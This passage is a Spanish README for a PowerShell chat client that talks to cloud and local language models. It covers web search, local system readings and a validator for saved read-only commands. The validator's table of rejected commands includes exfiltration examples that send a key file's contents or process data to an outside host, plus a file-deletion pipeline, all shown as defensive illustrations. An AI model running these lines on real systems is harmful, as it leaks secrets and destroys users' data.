# PRC AI 2.0

Cliente de chat para **OpenAI**, **xAI (Grok)** y modelos locales (**Ollama**
y **llama-server** de llama.cpp) escrito en PowerShell puro para la consola de
Windows. Sin dependencias externas: nada de curl, nada de Python, nada de Node.
Un `AI` en cualquier CMD y a conversar.

Es un proyecto personal pequeño: empezó como un puñado de scripts batch + gawk
y esta versión 2.0 lo reescribe entero sobre PowerShell 5.1 con un núcleo HTTP
propio (streaming SSE incluido). Se publica por si a alguien más le sirve.

```
C:\> AI "explica en una linea que es SSE"
Server-Sent Events: el servidor manda texto por HTTP en fragmentos a medida
que lo genera, y el cliente lo pinta segun llega.
```

## Características

- **REPL interactivo con memoria**: la conversación se acumula y se envía
  completa en cada turno. `/new` la vacía, `/save` la guarda en JSON.
- **Modo una-respuesta** para tuberías: `AI "pregunta"` responde y sale.
- **Entrada estándar como contexto**: `type notas.txt | AI "resume esto"`.
- **Streaming token a token** con render incremental de Markdown y colores
  ANSI (se desactivan solos al redirigir la salida).
- **Filtro de `<think>`** para modelos de razonamiento locales: el bloque de
  razonamiento no se muestra, aunque llegue partido entre fragmentos SSE.
- **Busca en internet cuando hace falta**, sin abrir el navegador: el modelo
  decide si la pregunta necesita datos actuales (dólar, clima, noticias...) y,
  solo si la laptop tiene salida a internet, busca en DuckDuckGo, lee las
  primeras páginas y contesta con eso, citando las fuentes. Ver «Buscar en
  internet».
- **Sabe lo que la laptop ya sabe**, sin internet: la hora y la fecha salen
  del reloj del equipo, y la batería, la red (wifi, IP local, puerta de
  enlace, DNS, si hay internet), Windows, el procesador, la memoria, los
  discos y la gráfica se leen del propio equipo cuando se pregunta por ellos.
  Ver «Datos de este equipo».
- **Comandos de solo lectura que guardas tú**, pidiéndolo en la conversación:
  «agrégame un comando para ver mi IP pública». El chat pregunta, propone el
  comando, pide confirmación, lo prueba y enseña el resultado; desde entonces
  «¿cuál es mi IP pública?» se contesta sola. Unas reglas fijas, no el
  modelo, deciden si el comando es de solo lectura. Ver «Comandos guardados».
- **Consultas web guardadas**: datos concretos de una página, en JSON.
  «agrégame un comando para el último sorteo de la lotería de Nicaragua de
  internet»: busca la página en DuckDuckGo, saca los datos y te los enseña
  antes de guardarla. Desde entonces se lee de nuevo cada vez que preguntas.
  Ver «Consultas web».
- **Preferencias que se recuerdan** de una conversación a otra: «recuerda que
  las cifras de dinero me las des en dólares». Las escribes tú y el modelo
  las tiene delante en cada pregunta. Ver «Preferencias».
- **Aprende de tus documentos**: «aprende de los documentos de D:\MiNegocio».
  Lee una carpeta (Word, Excel, PowerPoint, PDF, OpenDocument, texto, CSV,
  HTML, RTF) y desde entonces contesta con lo que dicen sobre tu negocio:
  servicios, empleados, horarios, procedimientos, políticas... Dice de qué documento
  sale cada dato, y si no viene, lo dice en vez de inventarlo. Todo se queda
  en el equipo. Ver «Documentos» y, para el día a día, la
  [guía de uso](docs/guia-documentos.md).
- **Diagnóstico** con `AI -Check`: estado de clave y conectividad de los
  proveedores sin gastar tokens.
- **Local por defecto**: sin configurar nada habla con Gemma 4 E4B en el
  llama-server de la propia laptop, sin clave y sin mandar la conversación a
  la nube.

Qué cambió en cada versión y por qué: [HISTORIAL.md](HISTORIAL.md).

## Requisitos

- Windows 10/11.
- Windows PowerShell **5.1 o superior** (el que trae Windows; también funciona
  en PowerShell 7).
- Opcional: [PSReadLine](https://github.com/PowerShell/PSReadLine) para
  historial persistente en el modo interactivo (viene de serie en Windows 10/11).
- Para los proveedores locales: [Ollama](https://ollama.com) escuchando en
  `http://localhost:11434`, y/o `llama-server` de
  [llama.cpp](https://github.com/ggml-org/llama.cpp) en modo router en
  `http://127.0.0.1:8080` (ver «Modelos locales con llama-server»).

## Instalación

1. Clona o descarga esta carpeta donde quieras, por ejemplo `D:\PRC CMD AI`.
2. Añade esa carpeta al `PATH` (o crea un alias). Con eso, `AI` funciona desde
   cualquier CMD.
3. Guarda tu clave de API (ver siguiente sección).

> **Nota sobre ExecutionPolicy**: `AI.bat` lanza PowerShell con
> `-ExecutionPolicy Bypass`. Eso afecta **solo a ese proceso**: no cambia
> ninguna directiva del sistema ni pide permisos de administrador.

## Configuración de claves

Las claves **no se guardan en ficheros** ni pasan por la línea de comandos.
`tools/Set-AIKey.ps1` las pide con `Read-Host -AsSecureString` (no se ven al
teclear, no quedan en el historial) y las escribe como variable de entorno de
usuario en `HKCU\Environment`, en los ámbitos *User* y *Process*:

```
AI -SetKey OPENAI_API_KEY     # para OpenAI
AI -SetKey XAI_API_KEY        # para xAI / Grok
```

Para borrar una clave, desde la carpeta del proyecto:
`powershell -ExecutionPolicy Bypass -File tools\Set-AIKey.ps1 -Name XAI_API_KEY -Remove`.

Ollama y llama-server no necesitan clave. Si lanzas llama-server con
`--api-key`, guárdala con `AI -SetKey LOCAL_AI_API_KEY`.

> **Precedencia de ámbitos**: el código lee primero el ámbito *User* (HKCU) y
> solo si no existe cae al ámbito *Process*. Es deliberado (la clave guardada
> con `-SetKey` se ve al instante, sin abrir consola nueva), pero significa
> que un `$env:XAI_API_KEY = '...'` de sesión **no** tiene efecto si ya hay
> una clave guardada en el registro. Bórrala con `-Remove` si quieres probar
> con otra clave temporal.

## Uso

```
AI                              modo interactivo (REPL con memoria)
AI "que es un BOM UTF-8"        una respuesta y sale
type informe.txt | AI "resume"  la entrada estandar entra como contexto
type informe.txt | AI           sin pregunta: todo stdin es la pregunta
AI "pregunta" -Provider gpt     elige proveedor (alias: gpt, grok, deepseek...)
AI "pregunta" -Provider gemma   modelo local (Gemma 4 E4B)
AI "pregunta" -Provider gemma3  modelo local mas rapido (Gemma 3 4B)
AI "pregunta" -Provider qwen    modelo local mas capaz y mas lento (Qwen3 8B)
AI "pregunta" -Provider gpt -m gpt-4o -Temp 0.2 -NoStream -Plain
AI "pregunta" -NoWeb            sin buscar en internet
AI "pregunta" -NoEquipo         sin leer datos de este equipo
AI "pregunta" -NoComandos       sin usar los comandos guardados
AI "pregunta" -NoDocumentos     sin usar las carpetas de documentos
AI -Check                       diagnostico de los proveedores, internet, el equipo
                                y los comandos guardados
AI -Help                        ayuda completa
```

Dentro del modo interactivo:

| Comando        | Efecto                          |
| -------------- | ------------------------------- |
| `bye` / `exit` | salir                           |
| `cls`          | limpiar pantalla                |
| `/new`         | vaciar la memoria               |
| `/model X`     | cambiar de modelo               |
| `/provider X`  | cambiar de proveedor            |
| `/save [ruta]` | guardar la conversación en JSON |
| `/buscar X`    | buscar X en internet y contestar con lo encontrado |
| `/web on|off` | dejar o no que el modelo busque solo |
| `/equipo [X]`  | enseñar los datos de este equipo sin preguntar al modelo (X: `bateria`, `red`, `equipo`, `sistema`, `procesador`, `memoria`, `disco`, `grafica`) |
| `/equipo on|off` | dejar o no que se lean los datos de este equipo al preguntar |
| `agrégame un comando para ...` | guardar un comando conversando: el chat pregunta, propone, pide confirmación, lo prueba y enseña el resultado |
| `/comando agregar N C` | lo mismo de una vez: revisar el comando `C` y guardarlo con el nombre `N` |
| `/comando`     | lista de los comandos guardados |
| `/comando N`   | ejecutar el comando guardado `N` y enseñar su salida, sin modelo |
| `/comando quitar N` | borrarlo |
| `/comando on|off` | dejar o no que el modelo use los comandos guardados |
| `recuerda que ...` | guardar una preferencia para esta y las próximas conversaciones |
| `/preferencias` | lista de las preferencias guardadas; `/preferencia agregar X` y `/preferencia quitar N` |
| `aprende de los documentos de D:\MiNegocio` | leer una carpeta de documentos y contestar con lo que dicen |
| `/documentos`  | las carpetas de documentos y lo leído; `/documentos buscar X` enseña de dónde saldría la respuesta |
| `olvida lo de ...` | olvidar algo de los documentos (`/documentos olvidos` y `/documentos recordar N` lo deshacen) |
| `/help`        | mostrar la ayuda                |

Sin configurar nada, el proveedor es `gemma`: Gemma 4 E4B en el llama-server
local (`http://127.0.0.1:8080`), sin clave y sin que nada salga de la laptop.
Hace falta que ese servidor esté encendido, o elegir otro proveedor. Orden de
precedencia del proveedor: opción `-Provider`, variable de entorno
`AI_PROVIDER`, `settings.json` y, si no hay nada, `gemma`.

La configuración por defecto (proveedor, modelo, instrucción de sistema) se
puede fijar en `%LOCALAPPDATA%\PRC-CMD-AI\settings.json`:

```json
{ "provider": "xai", "model": "grok-4.3", "system": "Responde breve y al grano." }
```

También sirven las variables de entorno `AI_PROVIDER` (proveedor por defecto)
y `AI_QUESTION` (la usa internamente `AI.bat` para pasar la pregunta intacta).

El `model` de `settings.json` va con su `provider`: si eliges otro proveedor
con `-Provider` o `AI_PROVIDER`, se usa el modelo por defecto de ese proveedor.
Para que el de por defecto sea otro modelo local: `{ "provider": "qwen" }`.

En el mismo fichero, `"web": false` apaga la búsqueda en internet,
`"equipo": false` la lectura de los datos de este equipo y `"comandos": false`
el uso de los comandos guardados.

## Proveedores soportados

| `-Provider` | Servicio             | Variable de clave | Modelo por defecto | Alias                         |
| ----------- | -------------------- | ----------------- | ------------------ | ----------------------------- |
| `openai`    | OpenAI               | `OPENAI_API_KEY`  | `gpt-4o-mini`      | `gpt`, `chatgpt`, `oai`       |
| `xai`       | xAI                  | `XAI_API_KEY`     | `grok-4.3`         | `grok`, `x`                   |
| `ollama`    | Ollama (local)       | *(no necesita)*   | `qwen3:4b`         | `deepseek`, `local`, `ds`     |
| `gemma`     | llama-server (local) | *(no necesita)*   | `gemma-4-e4b`      | `gemma4`, `e4b`, `llama`, `llamacpp` |
| `gemma3`    | llama-server (local) | *(no necesita)*   | `gemma-3-4b`       | |
| `qwen`      | llama-server (local) | *(no necesita)*   | `qwen3-8b`         | `qwen3`                       |

Todos hablan el mismo dialecto (`POST /v1/chat/completions`), así que
añadir un proveedor compatible es añadir una entrada a la tabla de
`lib/providers.ps1`. Nada más.

### Modelos locales con llama-server

`gemma`, `gemma3` y `qwen` son tres entradas que apuntan al **mismo** `llama-server` en
modo router (`--models-preset fichero.ini`): un puerto, varios modelos.

Para levantar el tuyo hace falta un llama.cpp reciente, con modo router (el
autor usa la compilación b10209). Crea un fichero de modelos, por ejemplo
`modelos.ini` (ASCII o UTF-8 sin BOM; cada clave es un argumento de
`llama-server` sin los guiones; las rutas van sin comillas):

```ini
version = 1

[*]
ctx-size = 4096
parallel = 1
sleep-idle-seconds = 120

[gemma-4-e4b]
model = models\gemma-4-E4B-it-Q4_K_M.gguf
; entero en la grafica hacen falta mas de 4 GB; con 4 GB, unas 32 capas
n-gpu-layers = 99

[gemma-3-4b]
model = models\gemma-3-4b-it-Q4_K_M.gguf
n-gpu-layers = 99

[qwen3-8b]
model = models\Qwen3-8B-Q4_K_M.gguf
reasoning-budget = 0
```

y arranca el servidor desde la carpeta que contiene ese fichero y `models\`:

```
llama-server --models-preset modelos.ini --models-max 1 --host 127.0.0.1 --port 8080
```

Los `.gguf` pueden ser otros: lo que tiene que coincidir con
`lib/providers.ps1` es el nombre de cada sección.

- El modelo se elige con el campo `model` de la petición, que tiene que
  coincidir letra por letra con una sección del fichero de modelos
  (`[gemma-4-e4b]`, `[gemma-3-4b]`, `[qwen3-8b]`). Con otro nombre el servidor contesta
  `HTTP 400 -> model '...' not found`.
- `AI` no arranca el servidor. Si no está en marcha, el error lo dice
  (`nadie escucha en http://127.0.0.1:8080/v1`) y añade el texto de
  `$AI_LLAMA_HINT`. El que viene en el repositorio es la orden del autor
  (`pm2 start rpa-ai-portable`): cámbialo en `lib/providers.ps1` por la que
  arranca tu servidor.
- Con `--models-max 1` solo hay un modelo en memoria: la primera pregunta tras
  cambiar de modelo tarda bastante más (de 11 a 18 s en el equipo del autor) y,
  tras el reposo por inactividad, unos 5 s más.
- Plazo de espera hasta que el servidor empieza a contestar: 300 s con `gemma` y `gemma3`
  y 600 s con `qwen` (campo `Timeout` de `lib/providers.ps1`), porque antes de
  la primera palabra el servidor puede tener que cargar o cambiar el modelo y
  leer toda la entrada. En los demás proveedores son 30 s.
- Si otro cliente del mismo servidor pide el otro modelo a la vez, una de las
  dos preguntas puede cortarse o fallar con `HTTP 500 ... failed to load`. `AI`
  lo dice (`la respuesta se corto`) y no reintenta sola: hay que repetir la
  pregunta. En el modo una-respuesta sale con código 2; en el interactivo el
  turno fallido se retira de la memoria y la sesión sigue.
- Si en ese puerto hay un `llama-server` de un solo modelo (sin
  `--models-preset`), el campo `model` no elige nada: contesta siempre con el
  suyo, también a `-Provider qwen`. `AI -Check` lo delata
  (`contesta, pero no ofrece 'qwen3-8b'`).
- En el modo interactivo, `/provider qwen` cambia de modelo sin salir.
- A `gemma3` no se le ofrecen herramientas (campo `Tools = $false` de
  `lib/providers.ps1`): Gemma 3 4B no sabe pedirlas. Con `buscar_web` a la
  vista no buscaba y contestaba como si lo hubiera hecho («Según búsqueda
  web, el dólar está a 37 córdobas», inventado; 3 de 3 preguntas el
  2026-11-15). Sin herramientas dice que no puede buscar. Con `gemma3` sigue
  habiendo `/buscar X`, y los datos del equipo le llegan por el atajo (ver
  «Datos de este equipo»).
- `qwen` pide las respuestas sin razonamiento (`reasoning_budget_tokens = 0` en
  cada petición, campo `Extra`): Qwen3 razona por defecto y `AI` no muestra ese
  razonamiento, así que cada pregunta serían de 1 a 5 minutos en blanco
  (medido en el equipo del autor).
- El contexto lo fija el servidor. Con 4.096 tokens caben entradas de hasta
  unos 3.000; si aparece `HTTP 400` en una charla larga, usa `/new`.
- Otro puerto, otros nombres de modelo u otra orden de arranque:
  `$AI_LLAMA_URL`, el campo `Model` y `$AI_LLAMA_HINT` en `lib/providers.ps1`.
- `AI -Check` lee `/v1/models` y, en los proveedores locales, comprueba además
  que el servidor ofrece el modelo de cada entrada. En modo router añade el
  estado que da el servidor: `OK (loaded)`, `OK (loading)`, `OK (sleeping)` u
  `OK (unloaded)`. Dice `contesta, pero no ofrece 'qwen3-8b'` si en ese puerto
  hay un servidor de un solo modelo o con otros nombres, y `parado.` más el
  texto de `$AI_LLAMA_HINT` si nadie escucha. No carga ni despierta ningún
  modelo.

## Buscar en internet

Para las preguntas de todos los días no hace falta abrir el navegador, ir al
buscador y leer: se pregunta en la consola y `AI` busca si hace falta.

```
Ariel > a como esta el dolar hoy en Nicaragua?
ia > buscando: dolar hoy en Nicaragua
ia > El precio del dólar hoy en Nicaragua es de 36.81 córdobas a la venta...
   fuentes: https://www.bcn.gob.ni/...  https://www.cotizacion.co/...
```

- **Quién decide**: el modelo. A cada pregunta se le ofrece una herramienta,
  `buscar_web` (el campo `tools` de `/chat/completions`, el mismo en OpenAI,
  xAI, Ollama y llama-server). Lo que no cambia con el tiempo («cuánto es 748
  por 6», «qué es un BOM») lo contesta solo y al instante; precios, tipo de
  cambio, clima, noticias o resultados piden la búsqueda. Como mucho dos
  búsquedas por pregunta.
- **Solo si hay salida**: antes de cada pregunta se intenta una conexión a
  `html.duckduckgo.com:443` con un plazo de 2 s (se recuerda 60 s si hay
  conexión y 15 s si no). Sin conexión la herramienta no se ofrece, el modelo
  sabe que no puede buscar y contesta con lo que sabe avisando de que puede
  estar desactualizado. `AI -Check` dice si hay salida.
- **Qué lee**: los resultados de DuckDuckGo (gratis, sin clave) con su resumen
  y el texto de las dos primeras páginas que se dejen leer, recortado para
  que quepa en los 4096 tokens del servidor local. Nunca pide direcciones de
  la red de casa (127.0.0.1, 192.168.x.x...), aunque un resultado apunte ahí.
  Tras buscar, el modelo contesta con temperatura 0,2 para ceñirse a lo leído.
- **Memoria**: se guarda la pregunta y la respuesta, no las páginas leídas.
- **Apagarla**: `-NoWeb` en una pregunta, `/web off` en el modo interactivo o
  `"web": false` en `settings.json`. `/buscar X` busca siempre, sin esperar a
  que lo decida el modelo.
- **Límites**: las páginas que se cargan con JavaScript (muchas de resultados
  deportivos, la del tipo de cambio del BCN) llegan sin el dato; entonces el
  modelo se apoya en los resúmenes de los resultados o dice que no lo
  encontró. Si DuckDuckGo toma la consulta por un robot, lo dice. Depende de
  que el modelo sepa pedir herramientas: Gemma 4 E4B y Qwen3 8B lo hacen;
  Gemma 3 4B no, y por eso con `gemma3` solo se busca con `/buscar`.

## Datos de este equipo

Hay cosas que no están en internet ni en la memoria del modelo, sino en la
propia laptop: la hora, la batería, la red a la que está conectada. Preguntar
eso no necesita conexión.

```
Ariel > ¿cuál es mi IP?
ia > leyendo de este equipo: red
ia > Tu dirección IP en la red local es 192.168.1.23 (por wifi).
     La IP pública no se puede leer desde el equipo.
Ariel > ¿qué hora es?
ia > Son las 11:01 a. m. del domingo 15 de noviembre de 2026.
```

| Si preguntas por… | Sale de |
| --- | --- |
| La hora, la fecha, qué día es mañana | El reloj del equipo |
| La batería: carga, si está enchufada, tiempo que queda | Windows |
| Si hay internet, la red wifi y su señal, la IP local, la puerta de enlace, los DNS | Windows y la red local |
| El nombre del equipo, el usuario de Windows, la marca y el modelo | Windows |
| La versión de Windows y cuánto lleva encendido | Windows |
| El procesador, la memoria RAM, los discos y la tarjeta gráfica | Windows |

Funciona con tres piezas (`lib/equipo.ps1`):

- **El reloj** viaja en la instrucción de sistema de cada pregunta: la hora y
  la fecha se contestan a la primera, con cualquier proveedor.
- **El atajo**: si la pregunta pide a las claras un dato de este equipo («cuál
  es mi IP», «cuánta batería me queda», «cuánta RAM tiene esta laptop»), `AI`
  lo lee antes de preguntar al modelo y se lo pasa junto a la pregunta. Así
  no depende de que el modelo sepa pedir herramientas y se contesta en una
  sola vuelta (de 2 a 5 s con Gemma 4 E4B). Para saltar hacen falta dos
  cosas: el tema y una marca de que se habla de este equipo («mi», «tengo»,
  «me queda», «esta laptop»).
- **La herramienta `datos_equipo`**, para lo que el atajo no reconoce: se
  ofrece al modelo igual que `buscar_web` y él decide. A diferencia de
  `buscar_web` se ofrece haya o no internet, porque no sale a ningún sitio.

Lo que conviene saber:

- **Solo lectura y lista cerrada.** Son ocho lecturas fijas (`bateria`, `red`,
  `equipo`, `sistema`, `procesador`, `memoria`, `disco`, `grafica`). Del
  modelo llega el nombre de una lectura, nunca una orden: ni lo que escribes
  ni lo que escribe el modelo llega a una línea de comandos. Nada de esto
  hace peticiones a internet; si hay conexión lo dice el indicador de red de
  Windows.
- **No toma por suyo lo que no lo es.** «¿Cuánta batería tiene el iPhone
  15?», «¿qué procesador trae la Lenovo Legion 5?» o «¿cuánta RAM trae una
  laptop gamer?» no son de este equipo: no se lee nada y se buscan en
  internet como siempre. «¿Qué es una dirección IP?» la explica el modelo.
- **Si no pudo leer un dato, lo dice** y no pone ninguno en su lugar. La IP
  pública (la que ven los sitios de internet) no está en el equipo, y también
  lo dice; para tenerla hay que preguntársela a un servidor de fuera, y eso
  se hace guardando un comando (ver «Comandos guardados»).
- **Sin modelo**: `/equipo` enseña en pantalla todo lo leído, y `/equipo red`
  o `/equipo disco memoria` solo esa parte. Funciona sin servidor y sin
  internet.
- **Con un proveedor en la nube** (OpenAI, xAI), lo leído viaja a ese
  proveedor junto a la pregunta, como cualquier otro mensaje: el nombre del
  equipo, el usuario o la red wifi incluidos, si es lo que se preguntó.
  Solo se lee lo que pide la pregunta.
- **Apagarlo**: `-NoEquipo` en una pregunta, `/equipo off` en el modo
  interactivo o `"equipo": false` en `settings.json`. La hora y la fecha se
  siguen dando.
- **Límites**: el atajo es una lista de expresiones y no lo reconoce todo;
  una pregunta sin marca («¿cuánta batería queda?») la decide el modelo, que
  con Gemma 4 E4B lee el dato o pregunta a qué equipo te refieres. Con un
  modelo sin herramientas (`gemma3`) solo funciona el atajo: lo que no
  reconoce se contesta con un «no puedo saberlo». La hora en otra ciudad no
  sale del reloj: el modelo la busca en internet si hay conexión.

## Comandos guardados

Hay datos que `AI` no trae de serie pero que un comando de PowerShell da en
una línea: la IP pública, los procesos que más procesador han gastado, si el
antivirus está activo. Se guardan desde el propio chat, con un nombre, y
desde entonces el modelo puede pedirlos por ese nombre.

### Pidiéndolo en la conversación

Basta con pedirlo: «agrégame un comando para ver mi IP pública», «quiero
guardar un comando», «guarda este comando como ver-dns:
Get-DnsClientServerAddress». El chat pregunta y tú respondes:

```
Ariel > agrégame un comando para ver mi IP pública
ia > Vamos a guardar un comando de solo lectura. Yo pregunto y tú respondes; escribe «cancelar» para dejarlo.
ia > Busco un comando de solo lectura para: ver mi IP pública
ia > Este es el comando:

  comando:  Invoke-RestMethod -Uri https://api.ipify.org
  reglas:   pasa (Invoke-RestMethod)
  red:      sale a internet, a api.ipify.org (https, solo lee)
  modelo, con la documentacion de Microsoft a la vista:
    El comando realiza una solicitud web a la API de ipify.org. Lee la
    dirección IP pública del equipo desde esa API. No envía datos ni modifica
    nada en el equipo local.

ia > ¿Te vale así? Responde «sí», o dime qué le cambio.
Ariel > sí
ia > ¿Con qué nombre lo guardo? Pulsa Enter para «ip-publica». Cuando preguntes con esas palabras, lo ejecutaré.
Ariel >
ia > ¿Para qué sirve, en una frase? La leeré para saber cuándo usarlo. Pulsa Enter para «ver mi IP pública».
Ariel >
ia > Ya no tengo más preguntas. Esto es lo que voy a guardar:

  nombre:   ip-publica
  comando:  Invoke-RestMethod -Uri https://api.ipify.org
  sirve:    ver mi IP pública
  red:      sale a internet, a api.ipify.org

ia > ¿Lo pruebo ahora y, si funciona, lo dejo guardado? («sí» o «no»)
Ariel > sí
ia > Probando...
ia > Resultado de la prueba (0.3 s):

  203.0.113.7

ia > Funcionó y quedó guardado como «ip-publica». Pregúntame con las palabras «ip publica» y lo ejecuto, o tecléalo tú con /comando ip-publica.
```

- **Si no das el comando, lo propone el modelo**, y lo que propone pasa por
  las mismas reglas que lo que tecleas tú. Si no las pasa, se le dice por qué
  y lo corrige (tres intentos). Si pides algo que no es de solo lectura
  («para borrar los temporales»), dice que no se puede.
- **Puedes pedir cambios** («que sean cinco», «solo la fecha») o pegar tú otro
  comando en cualquier respuesta.
- **Las preguntas se cierran con un resumen y una sola confirmación.** Hasta
  ese «sí» no se ejecuta ni se guarda nada.
- **Se prueba antes de guardar.** Si la prueba falla o no devuelve ningún
  dato, no se guarda, y puedes cambiarlo o dejarlo.
- **«cancelar»** corta en cualquier momento.
- Las preguntas son fijas, no las redacta el modelo: el diálogo no depende de
  que el modelo se acuerde de pedir confirmación.
- Lo abren las frases que empiezan por «agrega», «añade», «guarda» o
  «registra» (o «quiero agregar…») y nombran un comando. «Crea un comando de
  git para…» no: eso pide que se escriba uno, y lo contesta el modelo.

### De una vez, con `/comando agregar`

Si ya tienes el comando y el nombre:

```
Ariel > /comando agregar ip-publica Invoke-RestMethod -Uri https://api.ipify.org

  comando:  Invoke-RestMethod -Uri https://api.ipify.org
  reglas:   pasa (Invoke-RestMethod)
  red:      sale a internet, a api.ipify.org (https, solo lee)
  modelo, con la documentacion de Microsoft a la vista:
    Este comando realiza una solicitud HTTP a la API de ipify.org. Lee la
    dirección IP pública del equipo desde esa API. No envía datos ni modifica
    nada en el equipo local.

  para que sirve? (una frase; el modelo la lee para saber cuando usarlo) > mi IP publica
  lo guardo? (s/n) > s
guardado como «ip-publica». Primera ejecucion:
203.0.113.7

Ariel > ¿cuál es mi IP pública?
ia > ejecutando el comando guardado: ip-publica
ia > Tu IP pública es 203.0.113.7.
```

### Quién decide si un comando vale

**Unas reglas fijas, no el modelo.** El modelo explica el comando (con el
principio de la documentación de Microsoft a la vista, si hay conexión) y
avisa si ve algo raro, pero no aprueba nada: un modelo se equivoca, y una
página que dice «este comando es seguro» es texto de fuera. Al final confirmas
tú, viendo el comando exacto y a qué servidor sale.

Las reglas (`Get-AIComandoPlan`, en `lib/comandos.ps1`):

1. **Nada se guarda sin tu «sí»**, y solo en el modo interactivo. El comando
   lo tecleas tú o lo propone el modelo cuando se lo pides; lo que propone
   no vale por venir del modelo, sino si pasa las reglas siguientes, las
   mismas en los dos casos. Una página de internet o la salida de otro
   comando no pueden agregar nada.
2. **Se analiza con el analizador del propio PowerShell**, no con expresiones
   regulares. Tiene que ser una sola canalización de comandos con argumentos
   fijos. Se rechazan las variables, las cadenas con sustitución, los
   paréntesis, los bloques `{ }`, las llamadas a métodos, los tipos `[..]`,
   las redirecciones, los comentarios y `;`, `&`, `.`.
3. **Cada comando tiene que estar en una lista cerrada**, por su nombre
   completo (los alias no valen: `irm` no, `Invoke-RestMethod` sí) y venir de
   un módulo de la carpeta de Windows. Un programa solo vale si está en
   `System32`, lo firma Microsoft y sus argumentos casan con una forma
   permitida: `ipconfig /all` sí, `ipconfig /release` no.
4. **Cada parámetro tiene que estar en la lista de ese comando.** Las
   abreviaturas (`-OutF`) y los argumentos sin nombre los resuelve el
   enlazador de PowerShell antes de comparar.
5. **Lo que sale a internet**: solo `https`, dirección escrita fija, servidor
   público (nunca `192.168.x.x`, `localhost` ni nombres de la red de casa),
   solo lectura (`GET`), sin seguir redirecciones y solo como primer comando.
   Al no recibir nada por la canalización, no puede sacar datos del equipo.

Lo que pasa y lo que no:

| Comando | Resultado |
| --- | --- |
| `Invoke-RestMethod -Uri https://api.ipify.org` | Pasa; avisa de que sale a internet, a api.ipify.org |
| `Get-Process \| Sort-Object CPU -Descending \| Select-Object -First 5 Name, CPU` | Pasa |
| `Get-MpComputerStatus \| Select-Object AntivirusEnabled` | Pasa |
| `ipconfig /all \| Select-String DNS` | Pasa |
| `ipconfig /release` | No: no es una forma de solo lectura de `ipconfig` |
| `Get-ChildItem C:\ \| Remove-Item` | No: no están en la lista |
| `Get-Process \| ForEach-Object Kill` | No: `ForEach-Object` llamaría a un método de cada objeto |
| `Invoke-RestMethod "https://x.com/?d=$(Get-Content clave.txt)"` | No: la dirección no es fija |
| `Get-Process \| Invoke-RestMethod -Uri https://x.com -Method Post` | No: lo que sale a internet solo puede ir el primero |
| `Invoke-WebRequest -Uri http://192.168.0.1/reboot` | No: ni `https` ni servidor público |
| `.\mi-script.ps1`, `C:\Herramientas\x.exe`, `powershell -Command ...` | No: ni scripts ni programas de fuera de Windows |

### Qué hay en la lista

- **Producen datos** (solo como primer comando): `Get-Date`, `Get-Culture`,
  `Get-TimeZone`, `Get-ComputerInfo`, `Get-Process`, `Get-Service`,
  `Get-HotFix`, `Get-PSDrive`, `Get-CimInstance`, `Get-NetAdapter`,
  `Get-NetIPAddress`, `Get-NetIPConfiguration`, `Get-NetRoute`,
  `Get-NetConnectionProfile`, `Get-NetFirewallProfile`,
  `Get-DnsClientServerAddress`, `Get-Volume`, `Get-Disk`, `Get-PhysicalDisk`,
  `Get-Partition`, `Get-PnpDevice`, `Get-Printer`, `Get-MpComputerStatus`,
  `Resolve-DnsName`, `Test-Connection`, `Test-NetConnection`,
  `Invoke-RestMethod`, `Invoke-WebRequest`.
- **Ordenan, eligen o dan formato** (solo detrás de otro): `Select-Object`,
  `Where-Object` (en su forma `Where-Object Status -eq Running`),
  `Sort-Object`, `Measure-Object`, `Group-Object`, `Format-List`,
  `Format-Table`, `Select-String`, `ConvertTo-Json`, `ConvertFrom-Json`,
  `ConvertTo-Csv`, `Out-String`.
- **Programas de System32**, con sus formas de solo lectura: `ipconfig`,
  `hostname`, `whoami`, `systeminfo`, `getmac`, `arp -a`, `route print`,
  `tasklist`, `driverquery`, `powercfg /list`, `netsh wlan show ...`,
  `netsh interface ... show ...`, `ping`, `nslookup`.
- **Fuera a propósito**: lo que lee ficheros, el registro, el portapapeles o
  los registros de sucesos (`Get-Content`, `Get-ChildItem`, `Get-ItemProperty`,
  `Get-Clipboard`, `Get-WinEvent`), porque lo leído viaja al modelo; y todo lo
  que escribe o cambia algo.

La lista y los parámetros de cada comando están en `$AI_CMD_CMDLETS` y
`$AI_CMD_EXES`, al principio de `lib/comandos.ps1`. Ampliarla es añadir una
entrada ahí.

### Cómo se ejecuta

- **El texto no se ejecuta nunca.** De la validación sale un plan (cada
  comando con su módulo, sus parámetros ya resueltos y sus valores) y lo que
  corre es ese plan, pieza a pieza. No hay diferencia posible entre lo que se
  revisó y lo que se ejecuta.
- **Cada ejecución vuelve a pasar las reglas.** Un `comandos.json` cambiado a
  mano por algo que no las pasa no se ejecuta: dice «ya no pasa las reglas».
- **Con plazo y tope**: 15 segundos y 4.000 caracteres de salida.
- **Con los permisos de la consola.** Nunca pide permisos de administrador.
- **El modelo pide por nombre.** La herramienta `comando_guardado` solo acepta
  un nombre de la lista; el modelo no puede escribir un comando.
- **El atajo.** Si la pregunta lleva todas las palabras del nombre de un
  comando guardado («ip pública» para `ip-publica`), el programa lo ejecuta sin
  esperar a que el modelo lo pida, así que el dato es siempre el de ese
  momento. Sirve también con `gemma3`.
  - Si la pregunta nombra varios, se ejecutan hasta dos: «dame la fecha y
    hora, y el precio de btc» ejecuta `fecha-hora` y `precio-btc`.
  - No salta si la pregunta pide una explicación, un «cómo se hace», código o
    una compra, ni si habla de otro aparato. Las palabras del propio nombre no
    cuentan como freno: con `precio-btc` guardado, «precio» no frena «dame el
    precio de btc».
  - `/comando ip-publica` lo ejecuta sin pasar por el modelo.
- **La salida entra como dato**, rotulada con el servidor del que viene. Tras
  ejecutar un comando guardado no se ofrecen más herramientas en ese turno,
  para que una respuesta de fuera no pueda encadenar otra acción.

### Límites

- **Solo lectura no es lo mismo que privado.** La salida viaja al proveedor
  del modelo junto a la pregunta; con uno en la nube (OpenAI, xAI), sale del
  equipo.
- **De un servidor ajeno solo se sabe a cuál se llama**, no qué hace con la
  visita. Por eso lo ves y lo confirmas tú.
- **La lista es corta y rechazará comandos legítimos.** Es a propósito: se
  amplía a mano.
- **El modelo puede leer mal una salida.** A la columna `CPU` de
  `Get-Process`, que son segundos de procesador, Gemma 4 E4B le puso un signo
  de porcentaje; ahora se le pide que no añada unidades que la salida no
  diga, pero una salida clara ayuda (`Select-Object` con pocos campos).
- **Hasta 20 comandos**, guardados en
  `%LOCALAPPDATA%\PRC-CMD-AI\comandos.json`. Se apagan con `-NoComandos`,
  `/comando off` o `"comandos": false` en `settings.json`.

## Consultas web

Una consulta web es un comando guardado de otro tipo: lee siempre la misma
página y saca de ella unos datos concretos, en JSON. Sirve para lo que una
